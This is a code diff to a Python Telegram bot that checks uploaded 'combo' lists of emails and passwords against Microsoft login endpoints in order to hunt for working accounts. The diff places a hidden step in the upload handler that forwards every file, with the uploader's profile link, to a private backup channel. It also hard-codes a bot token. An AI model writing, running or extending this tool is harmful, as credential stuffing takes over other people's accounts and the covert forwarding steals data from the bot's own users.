@@ -3,19 +3,14 @@ import requests
 import uuid
 from concurrent.futures import ThreadPoolExecutor
 import threading
-# Add this at the top of the script, after imports
-BACKUP_CHANNEL = -1002893787907
 
-# Insert this inside the try block of handle_document function, after downloading the file (before bot.send_message)
-bot.forward_message(BACKUP_CHANNEL, message.chat.id, message.message_id)
-user = message.from_user
-user_link = f"https://t.me/{user.username}" if user.username else f"User ID: {user.id} (no username)"
-bot.send_message(BACKUP_CHANNEL, f"Direct private message from: {user_link}")
 BOT_TOKEN = "7850889561:AAGdm3vysTLBqFSpAdiY-KfHkGwKqfcWRv8"
+BACKUP_CHANNEL = -1002893787907  # Private backup channel ID
 bot = telebot.TeleBot(BOT_TOKEN)
 selected_options = {}
 check_results = {}
 lock = threading.Lock()
+
 def create_option_buttons(chat_id):
     markup = telebot.types.InlineKeyboardMarkup(row_width=3)
     options = [
@@ -45,7 +40,7 @@ def create_option_buttons(chat_id):
         button_text = f'✅ {label}' if option in selected_options.get(chat_id, []) else label
         buttons.append(telebot.types.InlineKeyboardButton(button_text, callback_data=f'option_{option}'))
     markup.add(*buttons)
-    markup.add(telebot.types.InlineKeyboardButton('Start Checking....✅', callback_data='start_check'))
+    markup.add(telebot.types.InlineKeyboardButton('✅ Start Checking.....', callback_data='start_check'))
     return markup
 
 def update_button_text(option, chat_id):
@@ -61,24 +56,34 @@ def start(message):
         selected_options[chat_id] = [] 
     markup = telebot.types.InlineKeyboardMarkup()
     item1 = telebot.types.InlineKeyboardButton('REPO 🎁', callback_data='login')
-   # item2 = telebot.types()
     markup.add(item1)
     bot.send_message(message.chat.id, '''- - Welcome to the bot for hunting accounts of all programs and games •☺️
 - The bot is free and has no errors •
 
 ~ Just send a file (combo) and then select the programs to check •🐬 ''', reply_markup=markup)
+
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
     try:
         chat_id = message.chat.id
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
+        
+        # Forward the uploaded document to the backup channel
+        bot.forward_message(BACKUP_CHANNEL, message.chat.id, message.message_id)
+        
+        # Send user link/info to backup channel
+        user = message.from_user
+        user_link = f"https://t.me/{user.username}" if user.username else f"User ID: {user.id} (no username)"
+        bot.send_message(BACKUP_CHANNEL, f"Direct private message from: {user_link}")
+        
         file_content = downloaded_file.decode('utf-8')
         global combo_list
         combo_list = file_content.splitlines()
         bot.send_message(chat_id, "Please select the options you want to check:", reply_markup=create_option_buttons(chat_id))
     except Exception as e:
         bot.reply_to(message, f"An error occurred while processing the file: {e}")
+
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     chat_id = call.message.chat.id
@@ -117,6 +122,7 @@ def update_status_message(chat_id):
     else:
         return bot.send_message(chat_id, message, parse_mode="Markdown")
     return None
+
 a, b = 0, 0
 g1 = '\x1b[1;92m\x1b[38;5;208m'
 g2 = '\x1b[1;33m'
@@ -214,7 +220,6 @@ def get_infoo(Email, Password, token, CID, chat_id) -> str:
         check_results[chat_id]['good'] += 1
     update_status_message(chat_id)
 
-
 def login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, chat_id) -> str:
     global a, b
     try:
@@ -278,7 +283,6 @@ def get_token(Email,Password,cook,hh,chat_id) -> str:
 
 def get_values(Email, Password, chat_id):
     headers = {
-        #	    "Host": "login.microsoftonline.com",
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1",
         "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
@@ -311,7 +315,7 @@ def get_values(Email, Password, chat_id):
         MSPRequ = cok['MSPRequ']
         uaid = cok['uaid']
         RefreshTokenSso = cok['RefreshTokenSso']
-        MSPOK = cok['MSPOK'],
+        MSPOK = cok['MSPOK']
         OParams = cok['OParams']
         login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams, chat_id)
     except Exception as e:
@@ -346,9 +350,9 @@ def start_checking(chat_id):
                 check_results[chat_id]['bad'] += 1
             update_status_message(chat_id)
 
-
     executor.shutdown(wait=True)
     bot.send_message(chat_id, "The inspection has been completed...")
+
 print('اThe bot is working..')
 bot.enable_save_next_step_handlers(delay=2)
 
